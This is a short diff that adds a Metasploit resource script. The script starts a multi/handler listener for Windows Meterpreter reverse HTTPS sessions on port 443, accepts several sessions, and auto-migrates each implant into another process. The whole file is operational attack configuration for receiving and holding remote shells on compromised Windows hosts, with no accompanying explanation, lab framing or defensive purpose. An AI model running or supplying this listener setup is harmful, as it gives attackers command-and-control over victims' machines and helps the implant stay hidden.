@@ -1,0 +1,7 @@
+use multi/handler
+set payload windows/meterpreter/reverse_https
+set LHOST 10.10.10.10
+set LPORT 443
+set ExitOnSession false
+set AutoRunScript post/windows/manage/smart_migrate
+exploit -j
